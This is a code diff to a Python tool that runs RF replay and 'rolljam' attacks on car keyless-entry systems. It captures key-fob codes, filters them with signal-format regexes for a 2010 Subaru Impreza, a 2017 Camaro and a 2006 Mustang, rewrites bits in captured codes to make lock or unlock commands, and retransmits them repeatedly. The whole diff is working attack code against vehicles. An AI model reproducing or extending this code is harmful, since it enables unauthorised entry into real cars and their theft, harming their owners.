@@ -257,7 +257,7 @@ def roll_receive(frequency, baudrate, modulation, rsleep, transmit, car):
         codeline += c
         #DEBUG  print(codeline)
     codes = re.split("fffff*", codeline)
-    #Perhaps add more splitting by several 000's on top of fff's
+    #TODO Perhaps add more splitting by several 000's on top of fff's
     #codes = re.split("0000000000000000000000000000000000*", codes1)
 
     #formatting
@@ -292,6 +292,7 @@ def roll_receive(frequency, baudrate, modulation, rsleep, transmit, car):
         raw_code = bitstring.BitArray(bin=(binary)).tobytes()
         #transmitting
         print("[+] Sending code "+str(code))
+        #sends code multiple times as many cars will have the same code sent 3-4 times before working
         d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
         print("[+] Sent")
     return signal  #codes separated by newlines
@@ -315,6 +316,7 @@ def roll_transmit(frequency, baudrate, modulation, code):
     raw_code = bitstring.BitArray(bin=(binary)).tobytes()
     #transmitting raw bytes
     print("[+] Sending code "+str(code))
+    #sends code multiple times as many cars will have the same code sent 3-4 times before working
     d.RFxmit((raw_code+"\x00\x00\x00\x00\x00\x00")*10)
     print("[+] Sent")
 
@@ -337,6 +339,7 @@ def rolljam_car(car, code):
         #lock and unlock needs tested (no longer have access to impreza), trunk and panic alarm need to be added
         #iterate through filtered code to find bits used to lock/unlock/etc and change given bits to code needed. then join code back together as it needs to be
         if command=="l":
+            code = bin(int(str(code), 16))
             i=160
             n_code=[]
             while i < 300:
@@ -351,7 +354,9 @@ def rolljam_car(car, code):
             #recreate code with changed bits
             full_code = (('1010'*41)+joined_code+('0'*9)+joined_code)
             new_code = hex(int(full_code, 2))
+            #TODO fix code offset      print(joined_code)
         elif command=="u":
+            code = bin(int(str(code), 16))
             i=160
             n_code=[]
             while i < 300:
@@ -366,10 +371,13 @@ def rolljam_car(car, code):
             #recreate code with changed bits
             full_code = (('1010'*41)+joined_code+('0'*9)+joined_code)
             new_code = hex(int(full_code, 2))
+            #TODO fix code offset      print(joined_code)
         elif command=="t":
+            print("--Trunk unlock not supported for Impreza yet; code unchanged--")
             #TODO need another subaru impreza (2010) to get codes from
             new_code = code
         elif command=="p":
+            print("--Panic alarm not supported for Impreza yet; code unchanged--")
             #TODO need another subaru impreza (2010) to get codes from
             new_code = code
     #if not one of the cars above was specified, return unaltered code
@@ -381,7 +389,7 @@ def rolljam_car(car, code):
         print("[-] Unknown command, code will remain unchanged.")
         return code
     #return altered code
-    print("[+] Code changed for ",car)
+    print("[+] Code changed for "+car)
     return new_code
 
 
@@ -391,7 +399,7 @@ def filter(car, codes):
     #use regex to filter out subaru codes
     if car=='impreza':
         print("Filtering codes for "+car)
-        for c in codes:
+        for c in codes[:-1]:
             binarycode=bin(int(c, 16))
             #checks if subaru code is formatted correctly
             rc = re.search('1010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101101010011010100110101010100110101010010101011010100101101001100[0-1]{8}1010101010101010110011001101[0-1]{17,20}', binarycode)
@@ -406,7 +414,7 @@ def filter(car, codes):
     #if camaro specified, filter out by known format for 2017 camaro
     elif car=='camaro':
         print("Filtering codes for "+car)
-        for c in codes:
+        for c in codes[:-1]:
             binarycode=bin(int(c, 16))
             rc = re.search('100110011001100110011001100110011001100110011001100110011001100110011001100110011001100101011001010101100101100101010101100110100101011010010110[0-1]{139,146}', binarycode)
             if rc is not None:
@@ -416,8 +424,10 @@ def filter(car, codes):
     #filter out by known format for 2006 mustang
     elif car=='mustang':
         print("Filtering codes for "+car)
-        for c in codes:
-            binarycode=bin(int(c, 16))
+        #using [:-1] so newlines aren't included
+        for c in codes[:-1]:
+            #DEBUG print(c)
+            binarycode=bin(int(str(c), 16))
             rc = re.search('10011001100110011001[0]{53,59}1001100110011001[0-1]{141,144}', binarycode)
             if rc is not None:
                 filtered_codes.append(hex(int(rc.group(0), 2)))
@@ -431,7 +441,7 @@ def filter(car, codes):
     if len(filtered_codes)==0:
         print("[-] No codes found")
         exit(1)
-
+    print("[+] Codes found")
     return filtered_codes
 
 
